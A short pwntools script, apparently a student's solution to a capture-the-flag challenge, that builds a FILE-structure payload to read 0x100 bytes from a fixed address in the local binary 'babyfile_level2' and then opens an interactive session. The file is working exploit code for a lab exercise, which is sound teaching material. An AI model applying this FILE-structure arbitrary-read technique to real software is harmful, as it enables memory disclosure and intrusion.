#Nagib Lakhdari 3si2
from pwn import *

context.arch = 'amd64'

# Start the process for the challenge binary
p = process("/challenge/babyfile_level2")

# Create a file structure payload to read from the specified address
fs = FileStructure()
payload = fs.read(0x4041f8, 0x100)

# Send the payload to the process
p.send(payload)

# Interact with the process to get the output
p.interactive()
